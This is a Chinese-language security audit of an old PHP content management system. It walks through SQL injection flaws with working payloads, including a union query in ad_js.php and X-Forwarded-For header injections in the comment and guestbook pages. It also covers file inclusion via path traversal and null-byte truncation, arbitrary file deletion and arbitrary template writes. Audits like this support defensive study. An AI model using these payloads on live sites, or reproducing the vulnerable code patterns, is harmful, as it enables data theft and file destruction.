## 转义函数

对部分参数默认进行转义操作

`common.inc.php`

```php
if(!get_magic_quotes_gpc())
{
    $_POST = deep_addslashes($_POST);
    $_GET = deep_addslashes($_GET);
    $_COOKIES = deep_addslashes($_COOKIES);
    $_REQUEST = deep_addslashes($_REQUEST);
}
```

`common.fun.php`

```php
function deep_addslashes($str)
{
    if(is_array($str))
    {
        foreach($str as $key=>$val)
        {
            $str[$key] = deep_addslashes($val);
        }
    }
    else
    {
        $str = addslashes($str);
    }
    return $str;
}
```

没有对`$_SERVER`进行转义,可能在User-Agent存在SQL注入

## ad_js.php存在SQL注入漏洞

```php
define('IN_BLUE', true);
require_once dirname(__FILE__) . '/include/common.inc.php';

$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';
if(empty($ad_id))
{
    echo 'Error!';
    exit();
}

$ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id);
```

尽管`$ad_id`进行了转义操作,但是在拼接sql语句时没有用引号将`$ad_id`进行包裹,因此产生了sql注入

但是`getone`没有将mysql的报错信息回显,不能进行报错注入

```php
    function getone($sql, $type=MYSQL_ASSOC){
        $query = $this->query($sql,$this->linkid);
        $row = mysql_fetch_array($query, $type);
        return $row;
    }
```

利用`echo "<!--\r\ndocument.write(\"".$ad_content."\");\r\n-->\r\n";`对`$ad_content`进行回显,从而进行联合查询注入

`ad_js.php?ad_id=1 union select 1,2,3,4,5,6,@@version;`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031527723.png)

## comment.php存在sql注入漏洞

`include/common.fun.php`

```php
function getip()
{
	if (getenv('HTTP_CLIENT_IP'))
	{
		$ip = getenv('HTTP_CLIENT_IP'); 
	}
	elseif (getenv('HTTP_X_FORWARDED_FOR')) 
	{
		$ip = getenv('HTTP_X_FORWARDED_FOR');
	}
	elseif (getenv('HTTP_X_FORWARDED')) 
	{ 
		$ip = getenv('HTTP_X_FORWARDED');
	}
	elseif (getenv('HTTP_FORWARDED_FOR'))
	{
		$ip = getenv('HTTP_FORWARDED_FOR'); 
	}
	elseif (getenv('HTTP_FORWARDED'))
	{
		$ip = getenv('HTTP_FORWARDED');
	}
	else
	{ 
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}
```

前面提到没有对`$_SERVER`进行转义,`getip`这个函数给了我们利用的点

引用查询

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031615790.png)

没有转义的情况,传入XFF头为`123'`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031637887.png)

添加`$_SERVER = deep_addslashes($_SERVER);`转义后的情况,仍然传入XFF头为`123'`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031638765.png)

利用这一点进行sql注入

在XFF头中传入`123','0'),('','1','0','0','0',database(),'1646297924','123','0')#`

构造出的sql语句为`INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '1', '0', '0', '0', '123', '1646298189', '123','0'),('','1','0','0','0',database(),'1646297924','123','0')#', '1')`

网页回显结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031703074.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031704697.png)

数据库查询结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031702732.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031704875.png)

## guest_book.php存在sql注入漏洞

```php
elseif ($act == 'send')
{
	$user_id = $_SESSION['user_id'] ? $_SESSION['user_id'] : 0;
	$rid = intval($_POST['rid']);
 	$content = !empty($_POST['content']) ? htmlspecialchars($_POST['content']) : '';
 	$content = nl2br($content);
 	if(empty($content))
 	{
 		showmsg('评论内容不能为空');
 	}
	$sql = "INSERT INTO " . table('guest_book') . " (id, rid, user_id, add_time, ip, content) 
			VALUES ('', '$rid', '$user_id', '$timestamp', '$online_ip', '$content')";
	$db->query($sql);
	showmsg('恭喜您留言成功', 'guest_book.php?page_id='.$_POST['page_id']);
}
```

在`common.inc.php`中,将`$online_ip`定义为`getip()`

这一个注入点的利用方式同上,在XFF头中传入`123',database())#`

网页回显结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031720519.png)

数据库查询结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203031720568.png)

## admin/ad.php存在SQL注入漏洞

```php
elseif($act == 'edit')
{
	 $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';
	 if(empty($ad_id))
	 {
		 return false;
	 }
	 $ad = $db->getone("SELECT ad_id, ad_name, time_set, start_time, end_time, content, exp_content FROM ".table('ad')." WHERE ad_id=".$ad_id);
	 template_assign(
	 	array(
	 		'current_act', 
	 		'act', 
	 		'ad'
	 	), 
	 	array(
	 		'�༭���', 
	 		$act, 
	 		$ad
	 	)
	 );
	 $smarty->display('ad_info.htm');
}

```

`$ad_id`仅经过trim,同时没有单引号闭合,`admin`目录下还有多个类似的注入点

## user.php存在文件包含漏洞

```php
elseif ($act == 'pay'){
    include 'data/pay.cache.php';
    $price = $_POST['price'];
    $id = $_POST['id'];
    $name = $_POST['name'];
    if (empty($_POST['pay'])) {
    	showmsg('对不起，您没有选择支付方式');
    }
    include 'include/payment/'.$_POST['pay']."/index.php";
}
```

利用`../`进行目录遍历并结合00截断进行文件包含

## user.php存在任意文件删除

```php
 //编辑个人资料
 elseif($act == 'edit_user_info'){
	 $user_id = intval($_SESSION['user_id']);
	 if(empty($user_id)){
		 return false;
	 }
	$birthday = trim($_POST['birthday']);
	$sex = intval($_POST['sex']);
    $email = !empty($_POST['email']) ? trim($_POST['email']) : '';
    $msn = !empty($_POST['msn']) ? trim($_POST['msn']) : '';
    $qq = !empty($_POST['qq']) ? trim($_POST['qq']) : '';
    $mobile_phone = !empty($_POST['mobile_phone']) ? trim($_POST['mobile_phone']) : '';
    $office_phone = !empty($_POST['office_phone']) ? trim($_POST['office_phone']) : '';
    $home_phone   = !empty($_POST['home_phone']) ? trim($_POST['home_phone']) : '';
	$address = !empty($_POST['address']) ? htmlspecialchars($_POST['address']) : '';

	if (!empty($_POST['face_pic1'])){
        if (strpos($_POST['face_pic1'], 'http://') != false && strpos($_POST['face_pic1'], 'https://') != false){
           showmsg('只支持本站相对路径地址');
         }
        else{
           $face_pic = trim($_POST['face_pic1']);
        }
    }else{
		if(file_exists(BLUE_ROOT.$_POST['face_pic3'])){
			@unlink(BLUE_ROOT.$_POST['face_pic3']);
		}
	}
```

```php
 	//插入新图片
	$db->query("DELETE FROM ".table('post_pic')." WHERE post_id = ".$post_id);
 	for($i=0;$i<4;$i++){
 		if($_POST['pic'.$i] && file_exists(BLUE_ROOT.$_POST['pic'.$i])){
 			$sql = "INSERT INTO ".table('post_pic')." (pic_id, post_id, pic_path) VALUES ('', '$post_id', '".$_POST['pic'.$i]."')";
 			$db->query($sql);
 		}
 	}
	//如果没有图片，则将信息缩略图设置为默认图片
	if (file_exists(BLUE_ROOT.$_POST['lit_pic'])) {
		@unlink(BLUE_ROOT.$_POST['lit_pic']);
	}
```

`face_pic3`和`lit_pic`均可以传入`../`进行目录遍历并删除某个文件

## admin.php存在任意文件删除

```php
elseif($act == 'del')
{
 	$file_name = !empty($_GET['file_name']) ? trim($_GET['file_name']) : '';
	$file = BLUE_ROOT.DATA."backup/".$file_name;
	if(!@unlink($file))
	{
		showmsg('删除备份文件失败');
	}
	else
	{
		showmsg('删除备份文件成功', 'database.php?act=restore');
	}
}
```

`$file_name`传入`../`进行目录遍历并删除某个文件

## admin/tpl_manage.php存在任意文件写入

```php
 elseif($act == 'do_edit'){
 	$tpl_name = !empty($_POST['tpl_name']) ? trim($_POST['tpl_name']) : '';
 	$tpl_content = !empty($_POST['tpl_content']) ? deep_stripslashes($_POST['tpl_content']) : '';
 	if(empty($tpl_name)){
 		return false;
 	}
 	$tpl = BLUE_ROOT.'templates/default/'.$tpl_name;
 	if(!$handle = @fopen($tpl, 'wb')){
		showmsg("打开目标模版文件 $tpl 失败");
 	}
 	if(fwrite($handle, $tpl_content) === false){
 		showmsg('写入目标 $tpl 失败');
 	}
 	fclose($handle);
 	showmsg('编辑模板成功', 'tpl_manage.php');
 }
```

>这里需要admin权限

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203032007882.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203032008035.png)